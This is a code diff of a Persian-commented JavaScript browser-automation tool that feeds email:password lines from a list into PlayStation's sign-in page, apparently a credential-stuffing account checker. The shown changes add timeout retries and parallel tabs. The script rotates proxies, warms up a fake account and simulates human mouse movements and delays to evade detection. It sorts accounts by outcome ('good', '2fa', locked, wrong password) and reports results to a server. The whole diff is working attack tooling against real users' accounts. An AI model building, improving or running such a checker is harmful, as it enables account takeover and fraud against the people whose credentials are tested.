@@ -917,10 +917,11 @@ async function processFakeAccountFirst(context) {
     console.log("🎭 Fake account warming completed. Now starting real accounts...");
 }
 
-// ==================== Enhanced: processAccountInTab with Smart Loading Detection ====================
+// ==================== Enhanced: processAccountInTab with Timeout Detection and Retry ====================
 async function processAccountInTab(context, accountLine, tabIndex) {
     let page = null;
     const maxRetries = 2;
+    const maxTimeoutRetries = 2; // حداکثر تعداد retry برای timeout
     const startTime = Date.now();
 
     try {
@@ -955,7 +956,7 @@ async function processAccountInTab(context, accountLine, tabIndex) {
                     });
                 }
 
-                // **اینجا بهبود اصلی: Smart loading detection**
+                // **Smart loading detection**
                 logger.info(`Tab ${tabIndex + 1}: ⏳ Waiting for page to fully load (checking for 'Sign in to PlayStation')...`);
                 const pageLoaded = await waitForPageContent(page, 'Sign in to PlayStation', 25000, tabIndex + 1);
 
@@ -981,8 +982,7 @@ async function processAccountInTab(context, accountLine, tabIndex) {
                         email,
                         status: 'server-error',
                         responseTime: Date.now() - startTime,
-                        tabIndex,
-                        shouldStopBatch: tabIndex === 0 // اگر اولین تب باشه، باید batch رو متوقف کنیم
+                        tabIndex
                     };
                 }
 
@@ -991,138 +991,210 @@ async function processAccountInTab(context, accountLine, tabIndex) {
             }
         }
 
-        // Additional settle time for any remaining async operations
-        if (WAIT_FOR_FULL_LOAD) {
-            logger.info(`Tab ${tabIndex + 1}: ⏱️ Additional settling time...`);
-            await sleep(PAGE_SETTLE_EXTRA_MS);
-        }
+        // **اینجا شروع حلقه اصلی برای retry در صورت timeout**
+        let timeoutRetryCount = 0;
+        let finalResult = null;
 
-        // Human-like behavior با تاخیر متفاوت برای هر تب
-        await randomMouseMovements(page);
-        await sleep(randomDelay(750, 1500) + (tabIndex * 300));
+        while (timeoutRetryCount <= maxTimeoutRetries) {
+            try {
+                // اگر این retry نیست، مراحل اولیه رو انجام بده
+                if (timeoutRetryCount === 0) {
+                    // Additional settle time for any remaining async operations
+                    if (WAIT_FOR_FULL_LOAD) {
+                        logger.info(`Tab ${tabIndex + 1}: ⏱️ Additional settling time...`);
+                        await sleep(PAGE_SETTLE_EXTRA_MS);
+                    }
 
-        const submitSelector = "button[type=submit]";
+                    // Human-like behavior با تاخیر متفاوت برای هر تب
+                    await randomMouseMovements(page);
+                    await sleep(randomDelay(750, 1500) + (tabIndex * 300));
+                } else {
+                    // اگر retry هست، صفحه رو رفرش کن
+                    logger.info(`🔄 Tab ${tabIndex + 1}: Refreshing page due to timeout (retry ${timeoutRetryCount}/${maxTimeoutRetries})...`);
+                    
+                    await page.reload({
+                        waitUntil: "domcontentloaded",
+                        timeout: 15000
+                    });
 
-        // Email with copy-paste method
-        logger.info(`📧 Tab ${tabIndex + 1}: Processing email with copy-paste method for ${email}`);
-        const emailFrame = await waitForFrameWithSelector(page, 'input[type="email"]', 20000);
-        const emailInput = emailLocator(emailFrame);
+                    // Smart loading detection بعد از رفرش
+                    const pageLoadedAfterRefresh = await waitForPageContent(page, 'Sign in to PlayStation', 25000, tabIndex + 1);
+                    
+                    if (!pageLoadedAfterRefresh) {
+                        throw new Error("Page did not load properly after refresh");
+                    }
 
-        const cutPassword = await humanPasteEmail(page, emailInput, accountLine);
-        await safeClickMayNavigate(page, emailFrame, submitSelector);
+                    logger.info(`Tab ${tabIndex + 1}: ✅ Page refreshed and loaded successfully!`);
 
-        // Password with paste
-        const passFrame = await waitForFrameWithSelector(page, 'input[type="password"]', 10000);
-        const passInput = passwordLocator(passFrame);
+                    // Additional settle time بعد از رفرش
+                    if (WAIT_FOR_FULL_LOAD) {
+                        await sleep(PAGE_SETTLE_EXTRA_MS);
+                    }
 
-        logger.info(`🔑 Tab ${tabIndex + 1}: Pasting password for ${email}`);
+                    await randomMouseMovements(page);
+                    await sleep(randomDelay(1000, 2000));
+                }
 
-        // Check for passkey
-        await sleep(randomDelay(1000, 1500) + (tabIndex * 200));
-        let bodyText = await page.evaluate(() => document.body?.innerText || "");
+                const submitSelector = "button[type=submit]";
 
-        if (bodyText.includes(`Sign In with Passkey`)) {
-            logger.info(`🔐 Tab ${tabIndex + 1}: Passkey detected for ${email}`);
-            return {
-                email,
-                status: 'passkey',
-                responseTime: Date.now() - startTime,
-                tabIndex
-            };
-        }
+                // Email with copy-paste method
+                logger.info(`📧 Tab ${tabIndex + 1}: Processing email with copy-paste method for ${email} ${timeoutRetryCount > 0 ? `(timeout retry ${timeoutRetryCount})` : ''}`);
+                const emailFrame = await waitForFrameWithSelector(page, 'input[type="email"]', 20000);
+                const emailInput = emailLocator(emailFrame);
 
-        await humanPastePassword(page, passInput, cutPassword);
-        await safeClickMayNavigate(page, passFrame, submitSelector);
+                const cutPassword = await humanPasteEmail(page, emailInput, accountLine);
+                await safeClickMayNavigate(page, emailFrame, submitSelector);
 
-        // Wait and check results
-        await sleep(3000 + randomDelay(500, 1500));
-        bodyText = await page.evaluate(() => document.body?.innerText || "");
+                // Password with paste
+                const passFrame = await waitForFrameWithSelector(page, 'input[type="password"]', 10000);
+                const passInput = passwordLocator(passFrame);
 
-        if (!bodyText) {
-            await sleep(2000 + randomDelay(1000, 2000));
-            bodyText = await page.evaluate(() => document.body?.innerText || "");
-        }
+                logger.info(`🔑 Tab ${tabIndex + 1}: Pasting password for ${email} ${timeoutRetryCount > 0 ? `(timeout retry ${timeoutRetryCount})` : ''}`);
 
-        // ادامه کد فقط اگر bodyText موجود باشه...
-        await waitFullLoadAndSettle(page);
+                // Check for passkey
+                await sleep(randomDelay(1000, 1500) + (tabIndex * 200));
+                let bodyText = await page.evaluate(() => document.body?.innerText || "");
 
-        // Human-like behavior: looking at page
-        await sleep(randomDelay(1000, 2000));
+                if (bodyText.includes(`Sign In with Passkey`)) {
+                    logger.info(`🔐 Tab ${tabIndex + 1}: Passkey detected for ${email}`);
+                    finalResult = {
+                        email,
+                        status: 'passkey',
+                        responseTime: Date.now() - startTime,
+                        tabIndex,
+                        retryCount: timeoutRetryCount
+                    };
+                    break; // خروج از حلقه retry
+                }
 
-        // گرفتن اسکرین‌شات با نام منحصر به فرد
-        const screenshotPath = await takeAdvancedScreenshot(page, `${email}---tab${tabIndex}---${Date.now()}.png`);
+                await humanPastePassword(page, passInput, cutPassword);
+                await safeClickMayNavigate(page, passFrame, submitSelector);
 
-        let status = 'unknown';
-        let shouldStopBatch = false;
+                // Wait and check results
+                await sleep(3000 + randomDelay(500, 1500));
+                bodyText = await page.evaluate(() => document.body?.innerText || "");
 
-        // Status checking logic با تشخیص server error در اولین تب
-        if (bodyText.includes(`A verification code has been sent to your email address`)) {
-            logger.info(`✅ Tab ${tabIndex + 1}: Good account - ${email}`);
-            status = 'good';
-        }
-        else if (bodyText.includes(`2-step verification is enabled. Open your authenticator app and get the verification code. Enter that code here.`)) {
-            logger.info(`🔐 Tab ${tabIndex + 1}: 2FA account - ${email}`);
-            status = '2fa';
-        }
-        else if (bodyText.includes(`Your account has been locked. To sign in, you'll need to recover your account.`)) {
-            logger.info(`🔒 Tab ${tabIndex + 1}: Guard account - ${email}`);
-            status = 'guard';
-        }
-        else if (bodyText.includes(`The sign-in ID (email address) or password you entered isn't correct, or you might need to reset your password for security reasons.`)) {
-            logger.info(`🔄 Tab ${tabIndex + 1}: Change pass account - ${email}`);
-            status = 'change-pass';
-        }
-        else if (bodyText.includes(`2-step verification is enabled. Check your mobile phone for a text message with a verification code`)) {
-            logger.info(`📱 Tab ${tabIndex + 1}: 2step mobile account - ${email}`);
-            status = 'mobile-2step';
-        }
-        else if (bodyText.includes(`Can't connect to the server`)) {
-            logger.info(`🌐 Tab ${tabIndex + 1}: Server connection error for ${email}`);
-            status = 'server-error';
-            
-            // **کلیدی: اگر اولین تب باشه، باید کل batch رو متوقف کنیم**
-            if (tabIndex === 0) {
-                logger.error(`🚨 CRITICAL: First tab encountered server error - stopping entire batch!`);
-                shouldStopBatch = true;
+                if (!bodyText) {
+                    await sleep(2000 + randomDelay(1000, 2000));
+                    bodyText = await page.evaluate(() => document.body?.innerText || "");
+                }
+
+                // **کلیدی: چک کردن timeout message**
+                if (bodyText.includes(`The connection to the server timed out.`)) {
+                    logger.warn(`⏰ Tab ${tabIndex + 1}: Timeout detected for ${email} - attempt ${timeoutRetryCount + 1}/${maxTimeoutRetries + 1}`);
+                    
+                    if (timeoutRetryCount < maxTimeoutRetries) {
+                        timeoutRetryCount++;
+                        logger.info(`🔄 Tab ${tabIndex + 1}: Will retry due to timeout...`);
+                        
+                        // تاخیر قبل از retry
+                        await sleep(2000 + randomDelay(1000, 2000));
+                        continue; // ادامه حلقه برای retry
+                    } else {
+                        logger.error(`❌ Tab ${tabIndex + 1}: Max timeout retries reached for ${email}`);
+                        finalResult = {
+                            email,
+                            status: 'timeout-error',
+                            responseTime: Date.now() - startTime,
+                            tabIndex,
+                            retryCount: timeoutRetryCount,
+                            message: 'Max timeout retries exceeded'
+                        };
+                        break; // خروج از حلقه
+                    }
+                }
+
+                // ادامه کد فقط اگر bodyText موجود باشه...
+                await waitFullLoadAndSettle(page);
+
+                // Human-like behavior: looking at page
+                await sleep(randomDelay(1000, 2000));
+
+                // گرفتن اسکرین‌شات با نام منحصر به فرد
+                const screenshotPath = await takeAdvancedScreenshot(page, `${email}---tab${tabIndex}---retry${timeoutRetryCount}---${Date.now()}.png`);
+
+                let status = 'unknown';
+
+                // Status checking logic
+                if (bodyText.includes(`A verification code has been sent to your email address`)) {
+                    logger.info(`✅ Tab ${tabIndex + 1}: Good account - ${email} ${timeoutRetryCount > 0 ? `(after ${timeoutRetryCount} timeout retries)` : ''}`);
+                    status = 'good';
+                }
+                else if (bodyText.includes(`2-step verification is enabled. Open your authenticator app and get the verification code. Enter that code here.`)) {
+                    logger.info(`🔐 Tab ${tabIndex + 1}: 2FA account - ${email} ${timeoutRetryCount > 0 ? `(after ${timeoutRetryCount} timeout retries)` : ''}`);
+                    status = '2fa';
+                }
+                else if (bodyText.includes(`Your account has been locked. To sign in, you'll need to recover your account.`)) {
+                    logger.info(`🔒 Tab ${tabIndex + 1}: Guard account - ${email} ${timeoutRetryCount > 0 ? `(after ${timeoutRetryCount} timeout retries)` : ''}`);
+                    status = 'guard';
+                }
+                else if (bodyText.includes(`The sign-in ID (email address) or password you entered isn't correct, or you might need to reset your password for security reasons.`)) {
+                    logger.info(`🔄 Tab ${tabIndex + 1}: Change pass account - ${email} ${timeoutRetryCount > 0 ? `(after ${timeoutRetryCount} timeout retries)` : ''}`);
+                    status = 'change-pass';
+                }
+                else if (bodyText.includes(`2-step verification is enabled. Check your mobile phone for a text message with a verification code`)) {
+                    logger.info(`📱 Tab ${tabIndex + 1}: 2step mobile account - ${email} ${timeoutRetryCount > 0 ? `(after ${timeoutRetryCount} timeout retries)` : ''}`);
+                    status = 'mobile-2step';
+                }
+                else if (bodyText.includes(`Can't connect to the server`)) {
+                    logger.info(`🌐 Tab ${tabIndex + 1}: Server connection error for ${email} ${timeoutRetryCount > 0 ? `(after ${timeoutRetryCount} timeout retries)` : ''}`);
+                    status = 'server-error';
+                }
+                else {
+                    logger.info(`❓ Tab ${tabIndex + 1}: Unknown result for ${email} ${timeoutRetryCount > 0 ? `(after ${timeoutRetryCount} timeout retries)` : ''}`);
+                    status = 'unknown';
+                }
+
+                const responseTime = Date.now() - startTime;
+                logger.info(`⏱️ Tab ${tabIndex + 1}: Processing completed in ${responseTime}ms ${timeoutRetryCount > 0 ? `(with ${timeoutRetryCount} timeout retries)` : ''}`);
+
+                finalResult = {
+                    email,
+                    status,
+                    responseTime,
+                    tabIndex,
+                    screenshot: screenshotPath,
+                    retryCount: timeoutRetryCount,
+                    additionalInfo: {
+                        bodyTextLength: bodyText.length,
+                        processingTime: responseTime,
+                        timeoutRetries: timeoutRetryCount
+                    }
+                };
+
+                break; // موفقیت - خروج از حلقه retry
+
+            } catch (retryErr) {
+                logger.error(`❌ Tab ${tabIndex + 1}: Error during retry ${timeoutRetryCount} for ${email}: ${retryErr.message}`);
+                
+                if (timeoutRetryCount >= maxTimeoutRetries) {
+                    finalResult = {
+                        email,
+                        status: 'error',
+                        error: retryErr.message,
+                        responseTime: Date.now() - startTime,
+                        tabIndex,
+                        retryCount: timeoutRetryCount
+                    };
+                    break;
+                } else {
+                    timeoutRetryCount++;
+                    await sleep(2000 + randomDelay(1000, 2000));
+                }
             }
         }
-        else {
-            logger.info(`❓ Tab ${tabIndex + 1}: Unknown result for ${email}`);
-            status = 'unknown';
-        }
 
-        const responseTime = Date.now() - startTime;
-        logger.info(`⏱️ Tab ${tabIndex + 1}: Processing completed in ${responseTime}ms`);
-
-        return {
-            email,
-            status,
-            responseTime,
-            tabIndex,
-            screenshot: screenshotPath,
-            shouldStopBatch, // **اضافه کردن flag برای متوقف کردن batch**
-            additionalInfo: {
-                bodyTextLength: bodyText.length,
-                processingTime: responseTime
-            }
-        };
+        return finalResult;
 
     } catch (err) {
         logger.error(`❌ Tab ${tabIndex + 1}: Error processing ${accountLine}: ${err.message}`);
-        
-        // اگر خطا در اولین تب رخ داده و مربوط به server باشه
-        const isServerError = err.message.includes('server') || 
-                            err.message.includes('connect') || 
-                            err.message.includes('network') ||
-                            err.message.includes('timeout');
         
         return {
             email: accountLine.split(':')[0],
             status: 'server-error',
             error: err.message,
             responseTime: Date.now() - startTime,
-            tabIndex,
-            shouldStopBatch: tabIndex === 0 && isServerError // متوقف کردن در صورت خطای server در تب اول
+            tabIndex
         };
     } finally {
         try {
@@ -1136,7 +1208,7 @@ async function processAccountInTab(context, accountLine, tabIndex) {
     }
 }
 
-// ==================== Smart Page Loading Detection Function ====================
+// ==================== Enhanced: waitForPageContent with timeout message detection ====================
 async function waitForPageContent(page, targetText, maxWaitTime = 25000, tabNumber = '') {
     const startTime = Date.now();
     const checkInterval = 2000; // هر 2 ثانیه چک کن
@@ -1154,6 +1226,12 @@ async function waitForPageContent(page, targetText, maxWaitTime = 25000, tabNumb
                 return true;
             }
 
+            // **اضافه: چک کردن timeout message در مرحله loading**
+            if (pageContent.includes(`The connection to the server timed out.`)) {
+                console.log(`[Tab ${tabNumber}] ⏰ Timeout message detected during page loading!`);
+                return false; // این باعث می‌شه که صفحه رفرش بشه
+            }
+
             // چک کردن با evaluate هم (برای دقت بیشتر)
             const hasText = await page.evaluate((text) => {
                 return document.body && document.body.innerText && document.body.innerText.includes(text);
@@ -1163,6 +1241,17 @@ async function waitForPageContent(page, targetText, maxWaitTime = 25000, tabNumb
                 const loadTime = Date.now() - startTime;
                 console.log(`[Tab ${tabNumber}] ✅ Target text found in body after ${loadTime}ms!`);
                 return true;
+            }
+
+            // چک کردن timeout message با evaluate هم
+            const hasTimeoutMessage = await page.evaluate(() => {
+                return document.body && document.body.innerText && 
+                       document.body.innerText.includes('The connection to the server timed out.');
+            }).catch(() => false);
+
+            if (hasTimeoutMessage) {
+                console.log(`[Tab ${tabNumber}] ⏰ Timeout message detected in body during page loading!`);
+                return false;
             }
 
             const elapsed = Date.now() - startTime;
@@ -1349,7 +1438,7 @@ async function cleanupProfile(profile) {
     }
 }
 
-// Enhanced processAccountsBatch with better status checking
+// ==================== Enhanced: processAccountsBatch with First Account Server Error Check ====================
 async function processAccountsBatch() {
     let context = null;
     let profile = null;
@@ -1455,118 +1544,139 @@ async function processAccountsBatch() {
             console.log("🎭 Continuing despite fake account error...");
         }
 
-        // **بهبود اصلی: پردازش sequential برای تشخیص زودهنگام server error**
-        console.log("🔄 Processing accounts sequentially to detect server errors early...");
+        // **بهبود اصلی: پردازش parallel ولی با چک اولین اکانت**
+        console.log("🚀 Processing accounts in parallel...");
         
-        const results = [];
+        const promises = accountBatch.map((accountLine, index) =>
+            processAccountInTab(context, accountLine, index)
+        );
+
+        const results = await Promise.allSettled(promises);
+
+        // **کلیدی: چک کردن نتیجه اولین اکانت (index 0)**
+        const firstAccountResult = results[0];
         let shouldStopProcessing = false;
 
-        for (let i = 0; i < accountBatch.length; i++) {
-            if (shouldStopProcessing) {
-                console.log(`⏹️ Stopping processing due to server error in first tab`);
-                break;
-            }
-
-            console.log(`📋 Processing account ${i + 1}/${accountBatch.length}: ${accountBatch[i].split(':')[0]}`);
+        if (firstAccountResult.status === 'fulfilled') {
+            const firstResult = firstAccountResult.value;
             
-            try {
-                const result = await processAccountInTab(context, accountBatch[i], i);
-                results.push({ status: 'fulfilled', value: result });
-
-                // **چک کردن اینکه آیا باید پردازش رو متوقف کنیم**
-                if (result.shouldStopBatch) {
-                    console.log(`🚨 Server error detected in first tab - stopping batch processing!`);
-                    shouldStopProcessing = true;
-                    
-                    // ارسال نتایج فوری به سرور
-                    await sendResultsToServer([result]);
-                    
-                    // حذف پروکسی مشکل‌دار
-                    if (usedProxy) {
-                        console.log(`❌ Removing problematic proxy: ${usedProxy.host}:${usedProxy.port}`);
-                        await removeUsedWorkingProxy(usedProxy);
-                    }
-                    
-                    break;
+            console.log(`🔍 Checking first account result: ${firstResult.email} - Status: ${firstResult.status}`);
+            
+            if (firstResult.status === 'server-error') {
+                console.log(`🚨 CRITICAL: First account encountered server error - stopping entire processing!`);
+                console.log(`📧 First account: ${firstResult.email}`);
+                console.log(`⏹️ Cancelling processing of remaining accounts in this batch`);
+                
+                shouldStopProcessing = true;
+                
+                // ارسال فوری نتیجه اولین اکانت به سرور
+                await sendResultsToServer([firstResult]);
+                
+                // حذف پروکسی مشکل‌دار
+                if (usedProxy) {
+                    console.log(`❌ Removing problematic proxy due to first account server error: ${usedProxy.host}:${usedProxy.port}`);
+                    await removeUsedWorkingProxy(usedProxy);
                 }
-
-            } catch (error) {
-                console.log(`❌ Error processing account ${i + 1}: ${error.message}`);
-                results.push({ 
-                    status: 'rejected', 
-                    reason: error.message,
-                    value: {
-                        email: accountBatch[i].split(':')[0],
-                        status: 'error',
-                        tabIndex: i,
-                        shouldStopBatch: i === 0 // اگر اولین تب باشه
-                    }
-                });
-
-                // اگر خطا در اولین تب رخ داده
-                if (i === 0) {
-                    console.log(`🚨 Error in first tab - stopping batch processing!`);
-                    shouldStopProcessing = true;
-                    break;
-                }
-            }
-
-            // تاخیر کوتاه بین اکانت‌ها
-            if (i < accountBatch.length - 1 && !shouldStopProcessing) {
-                await sleep(randomDelay(1000, 2000));
-            }
-        }
-
-        // Process results...
-        let proxyIssueDetected = false;
-        let serverErrorCount = 0;
-        const processedResults = [];
-
-        results.forEach((result, index) => {
-            if (result.status === 'fulfilled') {
-                console.log(`Tab ${index + 1}: Completed - ${result.value.email} (${result.value.status})`);
-                processedResults.push(result.value);
-
-                if (result.value.status === 'server-error') {
-                    serverErrorCount++;
-                }
+                
+                // فقط اولین اکانت رو از فایل حذف می‌کنیم
+                await removeProcessedAccounts(1);
+                console.log(`⚠️ Only first account removed from file due to server error`);
+                
+                return false; // متوقف کردن کل پردازش
             } else {
-                console.log(`Tab ${index + 1}: Failed - ${result.reason}`);
-
-                if (result.reason && typeof result.reason === 'string') {
-                    if (result.reason.includes('Can\'t connect to the server') ||
-                        result.reason.includes('net::ERR_') ||
-                        result.reason.includes('Target page, context or browser has been closed')) {
-                        proxyIssueDetected = true;
-                    }
-                }
-            }
-        });
-
-        // **ارسال نتایج به سرور (فقط اگر قبلاً ارسال نشده باشه)**
-        if (!shouldStopProcessing && processedResults.length > 0) {
-            await sendResultsToServer(processedResults);
-        }
-
-        // Handle proxy removal
-        if ((serverErrorCount > accountBatch.length / 2) || proxyIssueDetected || shouldStopProcessing) {
-            if (usedProxy) {
-                console.log(`❌ Proxy issues detected, removing: ${usedProxy.host}:${usedProxy.port}`);
-                await removeUsedWorkingProxy(usedProxy);
+                console.log(`✅ First account processed successfully: ${firstResult.email} (${firstResult.status})`);
             }
         } else {
+            // اگر اولین اکانت با خطا مواجه شده
+            console.log(`🚨 CRITICAL: First account failed with error - stopping entire processing!`);
+            console.log(`❌ Error: ${firstAccountResult.reason}`);
+            
+            shouldStopProcessing = true;
+            
+            // ایجاد نتیجه خطا برای اولین اکانت
+            const errorResult = {
+                email: accountBatch[0].split(':')[0],
+                status: 'server-error',
+                error: firstAccountResult.reason,
+                responseTime: 0,
+                tabIndex: 0
+            };
+            
+            await sendResultsToServer([errorResult]);
+            
             if (usedProxy) {
-                console.log(`✅ Proxy used successfully, removing: ${usedProxy.host}:${usedProxy.port}`);
+                console.log(`❌ Removing problematic proxy due to first account error: ${usedProxy.host}:${usedProxy.port}`);
                 await removeUsedWorkingProxy(usedProxy);
             }
+            
+            await removeProcessedAccounts(1);
+            return false;
         }
 
-        // Remove processed accounts (فقط تعداد واقعی پردازش شده)
-        const actualProcessedCount = results.length;
-        await removeProcessedAccounts(actualProcessedCount);
-        console.log(`✅ Batch completed. Processed ${actualProcessedCount} accounts.`);
-        
-        return !shouldStopProcessing; // اگر متوقف شده باشیم، false برمی‌گردونیم
+        // **اگر اولین اکانت موفق بود، ادامه پردازش نتایج**
+        if (!shouldStopProcessing) {
+            console.log(`✅ First account successful - processing all results...`);
+            
+            // Process all results...
+            let proxyIssueDetected = false;
+            let serverErrorCount = 0;
+            const processedResults = [];
+
+            results.forEach((result, index) => {
+                if (result.status === 'fulfilled') {
+                    console.log(`Tab ${index + 1}: Completed - ${result.value.email} (${result.value.status})`);
+                    processedResults.push(result.value);
+
+                    if (result.value.status === 'server-error') {
+                        serverErrorCount++;
+                    }
+                } else {
+                    console.log(`Tab ${index + 1}: Failed - ${result.reason}`);
+                    
+                    // ایجاد نتیجه برای اکانت‌های ناموفق
+                    const failedResult = {
+                        email: accountBatch[index].split(':')[0],
+                        status: 'error',
+                        error: result.reason,
+                        responseTime: 0,
+                        tabIndex: index
+                    };
+                    processedResults.push(failedResult);
+
+                    if (result.reason && typeof result.reason === 'string') {
+                        if (result.reason.includes('Can\'t connect to the server') ||
+                            result.reason.includes('net::ERR_') ||
+                            result.reason.includes('Target page, context or browser has been closed')) {
+                            proxyIssueDetected = true;
+                        }
+                    }
+                }
+            });
+
+            // ارسال همه نتایج به سرور
+            if (processedResults.length > 0) {
+                await sendResultsToServer(processedResults);
+            }
+
+            // Handle proxy removal
+            if ((serverErrorCount > accountBatch.length / 2) || proxyIssueDetected) {
+                if (usedProxy) {
+                    console.log(`❌ Proxy issues detected, removing: ${usedProxy.host}:${usedProxy.port}`);
+                    await removeUsedWorkingProxy(usedProxy);
+                }
+            } else {
+                if (usedProxy) {
+                    console.log(`✅ Proxy used successfully, removing: ${usedProxy.host}:${usedProxy.port}`);
+                    await removeUsedWorkingProxy(usedProxy);
+                }
+            }
+
+            // Remove all processed accounts
+            await removeProcessedAccounts(accountBatch.length);
+            console.log(`✅ Batch completed successfully. Processed ${accountBatch.length} accounts.`);
+        }
+
+        return !shouldStopProcessing;
 
     } catch (err) {
         console.log("❌ Error in batch processing:", err.message);
